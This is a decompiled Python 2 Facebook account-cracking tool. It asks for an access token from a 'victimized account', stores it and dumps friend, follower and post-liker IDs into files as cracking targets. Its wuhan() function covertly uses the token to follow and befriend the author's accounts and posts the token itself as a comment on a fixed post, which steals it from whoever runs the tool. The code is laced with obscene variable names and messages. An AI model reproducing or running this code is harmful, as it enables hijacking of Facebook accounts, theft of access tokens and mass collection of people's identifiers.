# Decompile by MR JADUGAR THE GAMER
# Time Succes decompile : 2022-04-01 10:40:39.997776
import os
try:
    import requests
except ImportError:
    print '\n [\xc3\x97] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [\xc3\x97] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [\xc3\x97] Modul Bs4 belum terinstall!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
ok = []
cp = []
id = []
user = []
num = 0
loop = 0
xi_jimpinx = '1714000985456399'
koh = '100005395413800'
url = 'https://mbasic.facebook.com'
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def tod():
    titik = [
     '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r%s[%s\xe2\x80\xa2%s] remove token%s' % (N, M, N, x),
        sys.stdout.flush()
        time.sleep(1)


logo = ' \n #########   ##         ## #########\n ##        ##  ##       ## ##        ##\n ##        ##   ##     ##  ##        ##\n ##        ##    ##   ##   ##        ##\n ##########       ## ##    ##########\n ##        ##     # ##     ##        ##\n ##        ##   ##   ##    ##        ##\n ##        ##  ##     ##   ##        ##\n ##########  ##         ## ##########'
lo_ngentod = '1714009362122228'

def hasil(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n%s[%s\xe2\x9c\x93%s] Crack Start' % (N, H, N)
        print '[%s\xe2\x9c\x93%s] Total  OK : %s%s%s' % (H, N, H, str(len(ok)), N)
        print '[%s\xe2\x9c\x93%s] Total  CP : %s%s%s\n' % (H, N, K, str(len(cp)), N)
        exit()
    else:
        print '\n\n[%s!%s] No Result' % (M, N)
        exit()


def yayanxd():
    os.system('clear')
    print '%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[%s login With token \n%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Do you know how to get facebook tokens?? \n%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Type [ %sopen%s ] to get facebook tokens ' % (O, N, O, N, O, N, H, N)
    print '%s\xe2\x95\x91%s ' % (O, N)
    kontol = raw_input('%s%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[?]%s Token :%s ' % (N, M, N, H))
    if kontol in ('open', 'Open', 'OPEN'):
        print '\n%s\xe2\x80\xa2%s Login to the victimized account on google chrome first.' % (B, N)
        time.sleep(2)
        print '%s\xe2\x80\xa2%s Do not forget!!  url change to %shttps://m.facebook.com' % (B, N, H)
        time.sleep(2)
        print '%s\xe2\x80\xa2%s After switching to Google Chrome.  click%three dots' % (B, N, H)
        time.sleep(2)
        print '%s\xe2\x80\xa2%s Then Click%sSearch On Page %s Just Type%sEAAA%s Then Copy.' % (B, N, H, N, H, N)
        time.sleep(2)
        raw_input('%s\xe2\x80\xa2%s ENTER ' % (O, N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
        print '%s\xe2\x95\x91%s ' % (O, N)
        print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Welcome%s%s%s Ngentod \x1b[0;96m]' % (O, N, H, nama, N)
        time.sleep(2)
        print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Wait Newly Updates \x1b[0;96m]' % (O, N)
        time.sleep(2)
        print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Before Use\x1b[0;96m]' % (O, N)
        time.sleep(2)
        print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Join My Fb Group\x1b[0;96m]' % (O, N)
        time.sleep(2)
        print '%s\xe2\x95\x91%s ' % (O, N)
        time.sleep(0.07)
        print '%s\xe2\x95\x91%s ' % (O, N)
        time.sleep(0.06)
        open('.memek.txt', 'w').write(kontol)
        raw_input('%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s ENTER \x1b[0;96m]' % (O, N))
        wuhan(kontol)
        os.system('xdg-open https://facebook.com/groups/bluechathouse/')
        moch_yayan()
    except KeyError:
        print '\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s] Token Expire' % (N, M, N)
        time.sleep(2)
        yayanxd()


def moch_yayan():
    os.system('clear')
    try:
        kontol = open('.memek.txt', 'r').read()
    except IOError:
        print '\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s] Token Invalid!' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .memek.txt')
        yayanxd()

    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
    except KeyError:
        print '\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s] Token Invalid' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .memek.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n%s[%s!%s] Tidak ada koneksi ngab' % (N, M, N))

    os.system('clear')
    print logo
    IP = requests.get('https://api.ipify.org').text
    print '%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s' % (O, N)
    print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[\x1b[0;97m User Name : %s' % nama
    time.sleep(0.04)
    print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[\x1b[0;97m User Ip : %s' % IP
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s' % (O, N)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Author : \x1b[0;93mJaved Iqbal (Sad-Boy)' % (O, N)
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Github : \x1b[0;93mBALOOXH-BRAND' % (O, N)
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s WhatsApp   : \x1b[0;93m+923422008140' % (O, N)
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s' % (O, N)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[1]%s \x1b[0;93mDump id \x1b[0;97mFrom Friend \x1b[0;96m[\x1b[0;93m5000\x1b[0;96m]' % (O, N)
    time.sleep(0.04)
    print '\x1b[0;97m%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[2]%s \x1b[0;93mDump id \x1b[0;97m from public friends \x1b[0;96m[\x1b[0;93m5000\x1b[0;96m]' % (O, N)
    time.sleep(0.04)
    print '\x1b[0;97m%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[3]%s \x1b[0;93mDump id \x1b[0;97m From Public followers \x1b[0;96m[\x1b[0;93m5000\x1b[0;96m]' % (O, N)
    time.sleep(0.04)
    print '\x1b[0;97m%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[4]%s \x1b[0;93mDump id \x1b[0;97m From like post\x1b[0;96m[\x1b[0;93m5000\x1b[0;96m]' % (O, N)
    time.sleep(0.04)
    print '\x1b[0;97m%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[5]%s Multi \x1b[0;93mCrack Facebook' % (O, N)
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[6]%s Check Info \x1b[0;93mfacebook' % (O, N)
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[7]%s View Result \x1b[0;93mcrack \x1b[0;97mMe' % (O, N)
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[8]%s Useragent \x1b[0;93mSitting' % (O, N)
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[9]%s Scrypt%s Info%s' % (O, N, O, N)
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[0]%s Exit\x1b[0;96m[%s Remove%s\x1b[0;96m]' % (O, N, K, N)
    time.sleep(0.04)
    print '%s\xe2\x95\x91%s' % (O, N)
    time.sleep(0.04)
    pepek = raw_input('\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[\xe2\x80\xa2] \x1b[0;97mMenu : ')
    if pepek == '':
        print '%s%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s DON T EMPTY KENTOD ]' % (N, M, N)
        time.sleep(2)
        moch_yayan()
    elif pepek in ('a', '1', '01'):
        teman(kontol)
    elif pepek in ('b', '2', '02'):
        publik(kontol)
    elif pepek in ('c', '3', '03'):
        followers(kontol)
    elif pepek in ('d', '4', '04'):
        postingan(kontol)
    elif pepek in ('e', '5', '05'):
        __crack__().plerr()
    elif pepek in ('f,', '6', '06'):
        cek_ingfo(kontol)
    elif pepek in ('g', '7', '07'):
        try:
            dirs = os.listdir('results')
            print '\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[ crack results stored in your file]'
            for file in dirs:
                print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s %s' % (O, N, file)

            file = raw_input('\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s] Enter File Name :%s ' % (M, N, H))
            if file == '':
                file = raw_input('%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s] Enter  file Name :%s %s' % (N, M, N, H, N))
            total = open('results/%s' % file).read().splitlines()
            print '%s%s\xe2\x95\xa0%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % (N, O, N)
            time.sleep(2)
            nm_file = ('%s' % file).replace('-', ' ')
            hps_nm = nm_file.replace('.txt', '').replace('OK', '').replace('CP', '')
            jalan('%s\xe2\x95\xa0[%s Result%scrack%s at the date of %s:%s%s%s total %s: %s%s%s ' % (M, N, O, N, M, O, hps_nm, N, M, O, len(total), O))
            print '%s%s\xe2\x95\xa0%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % (N, O, N)
            time.sleep(2)
            for memek in total:
                kontol = memek.replace('\n', '')
                titid = kontol.replace('[\xe2\x9c\x93] ', ' \x1b[0m[\x1b[1;92m\xe2\x9c\x93\x1b[0m]\x1b[1;92m ').replace(' \xe2\x95\xa0 ', ' \x1b[0m[\x1b[1;93m\xc3\x97\x1b[0m]\x1b[1;93m ')
                print '%s%s' % (titid, N)
                time.sleep(0.03)

            print '%s%s\xe2\x95\xa0%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % (N, O, N)
            time.sleep(2)
            raw_input('%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s Return ] ' % (O, N))
            moch_yayan()
        except IOError:
            print '\n%s[%s!%s] No Result' % (N, K, N)
            raw_input('%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s Return%s ] ' % (O, N))
            moch_yayan()

    elif pepek in ('h', '8', '08'):
        seting_yntkts()
    elif pepek in ('i', '9', '09'):
        info_tools()
    elif pepek in ('j', '0', '00'):
        print '\n'
        tod()
        time.sleep(1)
        os.system('rm -rf .memek.txt')
        jalan('\n%s[%s\xe2\x9c\x93%s]%s Sucessfully Deleted token' % (N, H, N, H))
        exit()
    else:
        print '\n%s[%s\xc3\x97%s] Menu [%s%s%s] No!!' % (N, M, N, M, pepek, N)
        time.sleep(2)
        moch_yayan()


def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100003252539235/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100061587581422/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100004624064179/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s' % (koh, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (lo_ngentod, kentod, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (xi_jimpinx, hoetank, kentod))
    except:
        pass


def teman(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        mmk = raw_input('\n%s%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[%s Name File  : ' % (N, O, N))
        asw = raw_input('%s%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s Limit id   : ' % (N, O, N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s' % (asw, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n[\x1b[0;96m%s\x1b[0m] [\x1b[0;92m%s\x1b[0m] Wait, I m Dump Id' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.003)

        ys.close()
        jalan('\n\n%s[%s\xe2\x9c\x93%s] successfully dump id from friend' % (N, H, N))
        print '[%s\xe2\x80\xa2%s] copy output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, H, cin, N)
        print 50 * '-'
        raw_input('[%s Press Enter%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(cin)
        jalan('\n%s[%s!%s] Failed to dump id, probably id is not public..\n' % (N, M, N))
        raw_input('[ %sBack%s ] ' % (O, N))
        moch_yayan()


def publik(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        csy = raw_input('\n%s%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[%s Id Public  : ' % (N, O, N))
        ahh = raw_input('%s%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Name File  : ' % (N, O, N))
        ihh = raw_input('%s%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s Limit id   : ' % (N, O, N))
        knt = ('dump/' + ahh + '.json').replace(' ', '_')
        ys = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n[\x1b[0;96m%s\x1b[0m] [\x1b[0;92m%s\x1b[0m] Wait, I m Dump Id' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.003)

        ys.close()
        jalan('\n\n%s[%s\xe2\x9c\x93%s] successfully dump id of public friend' % (N, H, N))
        print '[%s\xe2\x80\xa2%s] Copy output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, H, knt, N)
        print 50 * '-'
        raw_input('[%s PRESS ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(knt)
        jalan('\n%s[%s!%s] Id dump failed, maybe the id is not public.\n' % (N, M, N))
        raw_input('[ %sBack%s ] ' % (O, N))
        moch_yayan()


def followers(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        csy = raw_input('\n%s[%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[%s Id Followers  : ' % (N, O, N))
        mmk = raw_input('%s[%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Name File  : ' % (N, O, N))
        asw = raw_input('%s%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s Limit id   : ' % (N, O, N))
        ah = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (csy, asw, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n[\x1b[0;96m%s\x1b[0m] [\x1b[0;92m%s\x1b[0m] Wait Dump Id' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.003)

        ys.close()
        jalan('\n\n%s[%s\xe2\x9c\x93%s] Saved dump id Public total Followers' % (N, H, N))
        print '[%s\xe2\x80\xa2%s] Copy output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, H, ah, N)
        print 50 * '-'
        raw_input('[%s PRESS ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(ah)
        jalan('\n%s[%s!%s] Id dump failed, maybe the id is not Followers.\n' % (N, M, N))
        raw_input('[ %s Back%s ] ' % (O, N))
        moch_yayan()


def followers(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        csy = raw_input('\n%s%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[%s Id Followers  : ' % (N, O, N))
        mmk = raw_input('%s%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Name File  : ' % (N, O, N))
        asw = raw_input('%s%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s Limit Id   : ' % (N, O, N))
        ah = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (csy, asw, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n[\x1b[0;96m%s\x1b[0m] [\x1b[0;92m%s\x1b[0m] Wait Dump Id' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.003)

        ys.close()
        jalan('\n\n%s[%s\xe2\x9c\x93%s] Saved dump id public total followers' % (N, H, N))
        print '[%s\xe2\x80\xa2%s] Copy output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, H, ah, N)
        print 50 * '-'
        raw_input('[%s PRESS ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(ah)
        jalan('\n%s[%s!%s] Id May Be Not public.\n' % (N, M, N))
        raw_input('[ %sBack%s ] ' % (O, N))
        moch_yayan()


def postingan(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        csy = raw_input('\n%s%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[%s Id Postingan : ' % (N, O, N))
        ppk = raw_input('%s%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Nama File  : ' % (N, O, N))
        asw = raw_input('%s%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s Limit Id   : ' % (N, O, N))
        ahh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s' % (csy, asw, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n[\x1b[0;96m%s\x1b[0m] [\x1b[0;92m%s\x1b[0m] Wait Dump Id' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.003)

        ys.close()
        jalan('\n\n%s[%s\xe2\x9c\x93%s] Saved dump id public like post' % (N, H, N))
        print '[%s\xe2\x80\xa2%s] Copy output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, H, ahh, N)
        print 50 * '-'
        raw_input('[%s PRESS ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(ahh)
        jalan('\n%s[%s!%s]  id Not  public.\n' % (N, M, N))
        raw_input('[ %sBack%s ] ' % (O, N))
        moch_yayan()


def cek_ingfo(kontol):
    try:
        user = raw_input('\n[%s\xe2\x80\xa2%s] enter id or username : ' % (O, N))
        if user == '':
            print '\n[%s!%s] Do Not May Be Empty bro' % (M, N)
            cek_ingfo(kontol)
        url = 'https://lookup-id.com/'
        if 'facebook' in user:
            payload = {'fburl': user, 'check': 'Lookup'}
        else:
            payload = {'fburl': 'https://free.facebook.com/' + user, 'check': 'Lookup'}
        halaman = requests.post(url, data=payload).text.encode('utf-8')
        sop_ = BeautifulSoup(halaman, 'html.parser')
        email_ = sop_.find('span', id='code')
        idt = email_.text
        if user == 'me':
            idt = 'me'
        x = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, kontol)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s' % (M, N)

